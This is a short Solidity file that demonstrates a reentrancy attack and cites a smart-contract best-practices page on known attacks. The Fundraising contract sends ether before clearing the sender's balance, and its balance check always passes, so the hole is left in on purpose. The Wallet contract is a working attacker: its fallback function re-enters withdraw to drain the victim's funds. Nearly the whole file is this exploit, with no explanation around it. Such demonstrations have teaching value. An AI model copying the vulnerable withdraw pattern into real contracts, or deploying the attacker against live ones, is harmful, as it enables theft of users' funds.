// SPDX-License-Identifier: Unlicensed 
pragma solidity ^0.7.0;

//  ref: https://consensys.github.io/smart-contract-best-practices/known_attacks/#reentrancy
contract Fundraising {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] >= 0);
        uint amountToWithdraw = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}("");
        require(success,"Unsucced");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Wallet {
    
    Fundraising public fundraising;
    uint recursion = 3;

    function callSmartContract(address _smartContractAddress) public {
        fundraising = Fundraising(_smartContractAddress);
    }

 
    fallback() external payable {
        // if (address(fundraising).balance >= 1 ether) {
        if (recursion > 0) {
            recursion--;
            fundraising.withdraw();
        }
    }

    function depositAttack() external payable {
        require(msg.value >= 1 ether);
         fundraising.deposit{value: 1 ether}();
        fundraising.withdraw(); 
       
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    function getFundContractBalance() public view returns (uint){
        return address(fundraising).balance;
    
    }
}
